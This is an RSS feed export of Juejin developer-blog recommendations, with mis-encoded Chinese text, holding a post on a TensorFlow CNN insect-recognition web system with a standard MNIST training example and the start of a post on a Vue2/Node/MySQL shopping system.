<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[æ˜†è™«è¯†åˆ«ç³»ç»Ÿã€æœ€æ–°ç‰ˆã€‘Python+TensorFlow+Vue3+Django+äººå·¥æ™ºèƒ½+æ·±åº¦å­¦ä¹ +å·ç§¯ç¥ç»ç½‘ç»œç®—æ³•]]></title>    <link>https://juejin.cn/post/7577016562252103731</link>    <guid>https://juejin.cn/post/7577016562252103731</guid>    <pubDate>2025-11-27T07:06:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577016562252103731" data-draft-id="7576978338755002418" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ˜†è™«è¯†åˆ«ç³»ç»Ÿã€æœ€æ–°ç‰ˆã€‘Python+TensorFlow+Vue3+Django+äººå·¥æ™ºèƒ½+æ·±åº¦å­¦ä¹ +å·ç§¯ç¥ç»ç½‘ç»œç®—æ³•"/> <meta itemprop="keywords" content="åç«¯,å›¾åƒè¯†åˆ«"/> <meta itemprop="datePublished" content="2025-11-27T07:06:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ziwu"/> <meta itemprop="url" content="https://juejin.cn/user/607373397353726"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ˜†è™«è¯†åˆ«ç³»ç»Ÿã€æœ€æ–°ç‰ˆã€‘Python+TensorFlow+Vue3+Django+äººå·¥æ™ºèƒ½+æ·±åº¦å­¦ä¹ +å·ç§¯ç¥ç»ç½‘ç»œç®—æ³•
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/607373397353726/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ziwu
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T07:06:48.000Z" title="Thu Nov 27 2025 07:06:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€ä»‹ç»</h2>
<p>æ˜†è™«è¯†åˆ«ç³»ç»Ÿï¼Œæœ¬é¡¹ç›®ä¸ºä¸€æ¬¾åŸºäºæ·±åº¦å­¦ä¹ çš„æ˜†è™«è¯†åˆ«ç³»ç»Ÿï¼Œèåˆå½“å‰äººå·¥æ™ºèƒ½æŠ€æœ¯çƒ­ç‚¹ï¼Œé’ˆå¯¹10ç§å¸¸è§æ˜†è™«ï¼ˆåŒ…æ‹¬èœœèœ‚ã€ç”²è™«ã€è´è¶ã€è‰ã€èœ»èœ“ã€èš±èœ¢ã€è›¾ã€èå­ã€èœ—ç‰›ã€èœ˜è››ï¼‰æ„å»ºæ•°æ®é›†ï¼Œé‡‡ç”¨å·ç§¯ç¥ç»ç½‘ç»œï¼ˆCNNï¼‰è¿›è¡Œæ¨¡å‹è®­ç»ƒï¼Œæœ€ç»ˆå®ç°äº†é«˜ç²¾åº¦çš„å›¾åƒè¯†åˆ«æ¨¡å‹ï¼Œå¹¶æ­å»ºäº†å®Œæ•´çš„Webç«¯æ“ä½œå¹³å°ã€‚</p>
<p><strong>å‰ç«¯</strong>: Vue3ã€Element Plus</p>
<p><strong>åç«¯</strong>ï¼šDjango</p>
<p><strong>ç®—æ³•</strong>ï¼šTensorFlowã€å·ç§¯ç¥ç»ç½‘ç»œç®—æ³•</p>
<p><strong>å…·ä½“åŠŸèƒ½</strong>ï¼š</p>
<ol>
<li>ç³»ç»Ÿåˆ†ä¸ºç®¡ç†å‘˜å’Œç”¨æˆ·ä¸¤ä¸ªè§’è‰²ï¼Œç™»å½•åæ ¹æ®è§’è‰²æ˜¾ç¤ºå…¶å¯è®¿é—®çš„é¡µé¢æ¨¡å—ã€‚</li>
<li>ç™»å½•ç³»ç»Ÿåå¯å‘å¸ƒã€æŸ¥çœ‹ã€ç¼–è¾‘æ–‡ç« ï¼Œåˆ›å»ºæ–‡ç« åŠŸèƒ½ä¸­é›†æˆäº†markdownç¼–è¾‘å™¨ï¼Œå¯å¯¹æ–‡ç« è¿›è¡Œç¼–è¾‘ã€‚</li>
<li>åœ¨å›¾åƒè¯†åˆ«åŠŸèƒ½ä¸­ï¼Œç”¨æˆ·ä¸Šä¼ å›¾ç‰‡åï¼Œç‚¹å‡»è¯†åˆ«ï¼Œå¯è¾“å‡ºå…¶è¯†åˆ«ç»“æœå’Œç½®ä¿¡åº¦</li>
<li>åŸºäºEchartä»¥æŸ±çŠ¶å›¾å½¢å¼è¾“å‡ºæ‰€æœ‰ç§ç±»å¯¹åº”çš„ç½®ä¿¡åº¦åˆ†å¸ƒå›¾ã€‚</li>
<li>åœ¨æ™ºèƒ½é—®ç­”åŠŸèƒ½æ¨¡å—ä¸­ï¼šç”¨æˆ·è¾“å…¥é—®é¢˜ï¼Œåå°é€šè¿‡å¯¹æ¥Deepseekæ¥å£å®ç°æ™ºèƒ½é—®ç­”åŠŸèƒ½ã€‚</li>
<li>ç®¡ç†å‘˜å¯åœ¨ç”¨æˆ·ç®¡ç†æ¨¡å—ä¸­ï¼Œå¯¹ç”¨æˆ·è´¦æˆ·è¿›è¡Œç®¡ç†å’Œç¼–è¾‘ã€‚</li>
</ol>
<p><strong>å‰ç«¯</strong>: Vue3ã€Element Plus</p>
<p><strong>åç«¯</strong>ï¼šDjango</p>
<p><strong>ç®—æ³•</strong>ï¼šTensorFlowã€å·ç§¯ç¥ç»ç½‘ç»œç®—æ³•</p>
<p><strong>é€‰é¢˜èƒŒæ™¯ä¸æ„ä¹‰</strong>
éšç€äººå·¥æ™ºèƒ½æŠ€æœ¯çš„é£é€Ÿå‘å±•ï¼Œæ·±åº¦å­¦ä¹ åœ¨å›¾åƒè¯†åˆ«é¢†åŸŸå±•ç°å‡ºå·¨å¤§æ½œåŠ›ã€‚æ˜†è™«ä½œä¸ºåœ°çƒä¸Šç§ç±»æœ€ç¹å¤šçš„ç”Ÿç‰©ç¾¤ä½“ï¼Œå…¶å‡†ç¡®è¯†åˆ«å¯¹å†œä¸šã€ç”Ÿæ€ç ”ç©¶åŠç§‘æ™®æ•™è‚²å…·æœ‰é‡è¦æ„ä¹‰ã€‚ç„¶è€Œï¼Œä¼ ç»Ÿè¯†åˆ«æ–¹æ³•ä¾èµ–ä¸“å®¶ç»éªŒï¼Œæ•ˆç‡ä½ä¸‹ä¸”é—¨æ§›è¾ƒé«˜ã€‚ä¸ºæ­¤ï¼Œæœ¬é¡¹ç›®æ—¨åœ¨å¼€å‘ä¸€æ¬¾åŸºäºæ·±åº¦å­¦ä¹ çš„æ˜†è™«è¯†åˆ«ç³»ç»Ÿã€‚ç³»ç»Ÿèšç„¦åç§å¸¸è§æ˜†è™«ï¼Œåˆ©ç”¨å·ç§¯ç¥ç»ç½‘ç»œï¼ˆCNNï¼‰æ„å»ºé«˜ç²¾åº¦è¯†åˆ«æ¨¡å‹ï¼Œå¹¶é€šè¿‡é›†æˆVue3ä¸Djangoçš„Webå¹³å°ï¼Œä¸ºç”¨æˆ·æä¾›ä¾¿æ·çš„å›¾åƒè¯†åˆ«ã€ç½®ä¿¡åº¦å¯è§†åŒ–ä»¥åŠæ™ºèƒ½é—®ç­”ç­‰ä¸€ç«™å¼æœåŠ¡ã€‚è¿™ä¸ä»…æ¨åŠ¨äº†AIæŠ€æœ¯çš„å®é™…åº”ç”¨ï¼Œä¹Ÿä¸ºæ˜†è™«å­¦ç ”ç©¶ä¸æ™®åŠæä¾›äº†é«˜æ•ˆçš„æ•°å­—åŒ–å·¥å…·ã€‚</p>
<h2 data-id="heading-1">äºŒã€ç³»ç»Ÿæ•ˆæœå›¾ç‰‡å±•ç¤º</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/113a9e17933547a38c9c3c658ea769d5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeml3dQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832007&amp;x-signature=U2Y1eFmZKFvyX4XE3bthangqOcY%3D" alt="å›¾ç‰‡" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0978217f03924203a69078b5efa5a95e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeml3dQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832007&amp;x-signature=6duipuJ0ak23CHVAhsXKAZcm0TQ%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h2 data-id="heading-2">ä¸‰ã€æ¼”ç¤ºè§†é¢‘ and å®Œæ•´ä»£ç  and å®‰è£…</h2>
<p>åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fziwupy.cn%2Fp%2FkFy9pd" target="_blank" title="https://ziwupy.cn/p/kFy9pd" ref="nofollow noopener noreferrer">ziwupy.cn/p/kFy9pd</a></p>
<h2 data-id="heading-3">å››ã€å·ç§¯ç¥ç»ç½‘ç»œç®—æ³•ä»‹ç»</h2>
<p>å·ç§¯ç¥ç»ç½‘ç»œï¼ˆConvolutional Neural Network, CNNï¼‰æ˜¯ä¸€ç§ä¸“ä¸ºå¤„ç†ç½‘æ ¼çŠ¶æ•°æ®ï¼ˆå¦‚å›¾åƒï¼‰è€Œè®¾è®¡çš„æ·±åº¦å­¦ä¹ ç®—æ³•ã€‚å…¶æ ¸å¿ƒæ€æƒ³åœ¨äºé€šè¿‡â€œå·ç§¯â€æ“ä½œï¼Œè‡ªåŠ¨æå–å›¾åƒä»ä½çº§åˆ°é«˜çº§çš„å±‚æ¬¡åŒ–ç‰¹å¾ã€‚</p>
<p>CNNä¸»è¦ç”±ä»¥ä¸‹å…³é”®å±‚æ„æˆï¼š</p>
<ol>
<li><strong>å·ç§¯å±‚</strong>ï¼šä½¿ç”¨å¤šä¸ªå¯å­¦ä¹ çš„æ»¤æ³¢å™¨ï¼ˆæˆ–ç§°å·ç§¯æ ¸ï¼‰åœ¨è¾“å…¥å›¾åƒä¸Šæ»‘åŠ¨ï¼Œé€šè¿‡è®¡ç®—å±€éƒ¨åŒºåŸŸçš„ç‚¹ç§¯æ¥æå–ç‰¹å¾ï¼ˆå¦‚è¾¹ç¼˜ã€è§’ç‚¹ã€çº¹ç†ï¼‰ã€‚è¿™æå¤§åœ°å‡å°‘äº†å‚æ•°æ•°é‡å¹¶ä¿ç•™äº†åƒç´ é—´çš„ç©ºé—´å…³ç³»ã€‚</li>
<li><strong>æ± åŒ–å±‚</strong>ï¼šé€šå¸¸åœ¨å·ç§¯å±‚ä¹‹åï¼Œç”¨äºå¯¹ç‰¹å¾å›¾è¿›è¡Œä¸‹é‡‡æ ·ï¼ˆå¦‚æœ€å¤§æ± åŒ–ï¼‰ï¼Œä¿ç•™æœ€æ˜¾è‘—ç‰¹å¾çš„åŒæ—¶é™ä½æ•°æ®ç»´åº¦å’Œè®¡ç®—å¤æ‚åº¦ï¼Œå¢å¼ºæ¨¡å‹çš„å¹³ç§»ä¸å˜æ€§ã€‚</li>
<li><strong>å…¨è¿æ¥å±‚</strong>ï¼šåœ¨ç½‘ç»œçš„æœ«ç«¯ï¼Œå°†ç»è¿‡å¤šæ¬¡å·ç§¯å’Œæ± åŒ–åæå–åˆ°çš„å±•å¼€ç‰¹å¾è¿›è¡Œæ•´åˆï¼Œå¹¶æ˜ å°„åˆ°æœ€ç»ˆçš„è¾“å‡ºå±‚ï¼ˆå¦‚åˆ†ç±»ä»»åŠ¡ä¸­çš„Softmaxå±‚ï¼‰ä»¥å®Œæˆåˆ†ç±»æˆ–è¯†åˆ«ã€‚</li>
</ol>
<p>é€šè¿‡å †å è¿™äº›å±‚ï¼ŒCNNèƒ½å¤Ÿä»åŸå§‹åƒç´ ä¸­é€æ­¥å­¦ä¹ åˆ°è¶Šæ¥è¶Šå¤æ‚å’ŒæŠ½è±¡çš„ç‰¹å¾ï¼Œæœ€ç»ˆå®ç°é«˜æ•ˆçš„å›¾åƒè¯†åˆ«ã€‚</p>
<p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªä½¿ç”¨TensorFlowå’ŒKeras APIæ„å»ºä¸€ä¸ªç®€å•CNNæ¨¡å‹ï¼Œå¹¶åœ¨MNISTæ‰‹å†™æ•°å­—æ•°æ®é›†ä¸Šè¿›è¡Œè®­ç»ƒçš„ç¤ºä¾‹ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> tensorflow <span class="hljs-keyword">as</span> tf
<span class="hljs-keyword">from</span> tensorflow.keras <span class="hljs-keyword">import</span> datasets, layers, models

<span class="hljs-comment"># 1. åŠ è½½å¹¶é¢„å¤„ç†æ•°æ®</span>
(train_images, train_labels), (test_images, test_labels) = datasets.mnist.load_data()
<span class="hljs-comment"># å°†å›¾åƒé‡å¡‘ä¸º (28, 28, 1) å¹¶å½’ä¸€åŒ–åƒç´ å€¼</span>
train_images = train_images.reshape((<span class="hljs-number">60000</span>, <span class="hljs-number">28</span>, <span class="hljs-number">28</span>, <span class="hljs-number">1</span>)).astype(<span class="hljs-string">'float32'</span>) / <span class="hljs-number">255</span>
test_images = test_images.reshape((<span class="hljs-number">10000</span>, <span class="hljs-number">28</span>, <span class="hljs-number">28</span>, <span class="hljs-number">1</span>)).astype(<span class="hljs-string">'float32'</span>) / <span class="hljs-number">255</span>

<span class="hljs-comment"># 2. æ„å»ºCNNæ¨¡å‹</span>
model = models.Sequential([
    <span class="hljs-comment"># ç¬¬ä¸€ä¸ªå·ç§¯å—</span>
    layers.Conv2D(<span class="hljs-number">32</span>, (<span class="hljs-number">3</span>, <span class="hljs-number">3</span>), activation=<span class="hljs-string">'relu'</span>, input_shape=(<span class="hljs-number">28</span>, <span class="hljs-number">28</span>, <span class="hljs-number">1</span>)),
    layers.MaxPooling2D((<span class="hljs-number">2</span>, <span class="hljs-number">2</span>)),
    <span class="hljs-comment"># ç¬¬äºŒä¸ªå·ç§¯å—</span>
    layers.Conv2D(<span class="hljs-number">64</span>, (<span class="hljs-number">3</span>, <span class="hljs-number">3</span>), activation=<span class="hljs-string">'relu'</span>),
    layers.MaxPooling2D((<span class="hljs-number">2</span>, <span class="hljs-number">2</span>)),
    <span class="hljs-comment"># åˆ†ç±»å™¨</span>
    layers.Flatten(),
    layers.Dense(<span class="hljs-number">64</span>, activation=<span class="hljs-string">'relu'</span>),
    layers.Dense(<span class="hljs-number">10</span>, activation=<span class="hljs-string">'softmax'</span>) <span class="hljs-comment"># 10ä¸ªæ•°å­—ç±»åˆ«ï¼Œè¾“å‡ºæ¦‚ç‡åˆ†å¸ƒ</span>
])

<span class="hljs-comment"># 3. ç¼–è¯‘æ¨¡å‹</span>
model.<span class="hljs-built_in">compile</span>(optimizer=<span class="hljs-string">'adam'</span>,
              loss=<span class="hljs-string">'sparse_categorical_crossentropy'</span>,
              metrics=[<span class="hljs-string">'accuracy'</span>])

<span class="hljs-comment"># 4. è®­ç»ƒæ¨¡å‹</span>
model.fit(train_images, train_labels, epochs=<span class="hljs-number">5</span>, 
          validation_data=(test_images, test_labels))

<span class="hljs-comment"># 5. è¯„ä¼°æ¨¡å‹</span>
test_loss, test_acc = model.evaluate(test_images, test_labels, verbose=<span class="hljs-number">2</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f'\nTest accuracy: <span class="hljs-subst">{test_acc}</span>'</span>)
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5ac7ba6f312406c850ff502dc725b56~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeml3dQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832007&amp;x-signature=e4oovUGuvmivpjoBuwpeoXGm14I%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è¿™ä¸ªæµç¨‹å›¾æ¸…æ™°åœ°å±•ç¤ºäº†CNNè¿›è¡Œå›¾åƒè¯†åˆ«çš„ä¸‰ä¸ªæ ¸å¿ƒæ­¥éª¤ï¼š</p>
<ol>
<li><strong>å·ç§¯å±‚</strong>ï¼šæ¥æ”¶è¾“å…¥å›¾åƒï¼Œä½¿ç”¨å·ç§¯æ ¸è‡ªåŠ¨æ‰«æå¹¶æå–å±€éƒ¨ç‰¹å¾ï¼ˆå¦‚è¾¹ç¼˜ã€çº¹ç†ï¼‰ã€‚</li>
<li><strong>æ± åŒ–å±‚</strong>ï¼šå¯¹å·ç§¯å±‚è¾“å‡ºçš„ç‰¹å¾å›¾è¿›è¡Œä¸‹é‡‡æ ·ï¼Œä¿ç•™æœ€å…³é”®ä¿¡æ¯ï¼Œå‡å°‘è®¡ç®—é‡å¹¶å¢å¼ºæ¨¡å‹ç¨³å®šæ€§ã€‚</li>
<li><strong>å…¨è¿æ¥å±‚</strong>ï¼šå°†ç»è¿‡å¤šæ¬¡å·ç§¯å’Œæ± åŒ–åå­¦ä¹ åˆ°çš„é«˜çº§ç‰¹å¾è¿›è¡Œæ•´åˆï¼Œå¹¶æ˜ å°„åˆ°æœ€ç»ˆçš„è¾“å‡ºç±»åˆ«ï¼Œå®Œæˆå›¾åƒåˆ†ç±»ã€‚</li>
</ol>
<p>åœ¨å®é™…åº”ç”¨ä¸­ï¼Œæ¨¡å‹é€šå¸¸ä¼šå †å å¤šä¸ªâ€œå·ç§¯-æ± åŒ–â€å±‚ç»„ä»¥å­¦ä¹ æ›´å¤æ‚çš„ç‰¹å¾ï¼Œä½†ä»¥ä¸Šä¸‰ä¸ªç¯èŠ‚æ„æˆäº†æœ€æ ¸å¿ƒã€ä¸å¯æˆ–ç¼ºçš„è¯†åˆ«æµç¨‹ã€‚æ‚¨çš„æ˜†è™«è¯†åˆ«ç³»ç»Ÿæ­£æ˜¯åŸºäºæ­¤æµç¨‹ï¼Œé€šè¿‡è®­ç»ƒè®©ç½‘ç»œå­¦ä¼šåŒºåˆ†10ç§ä¸åŒæ˜†è™«çš„ç‰¹å¾ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[vue2 + node + express + MySQL 5.7 çš„è´­ç‰©ç³»ç»Ÿ]]></title>    <link>https://juejin.cn/post/7576929700842668041</link>    <guid>https://juejin.cn/post/7576929700842668041</guid>    <pubDate>2025-11-27T07:08:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576929700842668041" data-draft-id="7577016562251907123" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="vue2 + node + express + MySQL 5.7 çš„è´­ç‰©ç³»ç»Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-11-27T07:08:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ‰§å¿µåšæŒ"/> <meta itemprop="url" content="https://juejin.cn/user/422649862826327"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            vue2 + node + express + MySQL 5.7 çš„è´­ç‰©ç³»ç»Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/422649862826327/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ‰§å¿µåšæŒ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T07:08:34.000Z" title="Thu Nov 27 2025 07:08:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 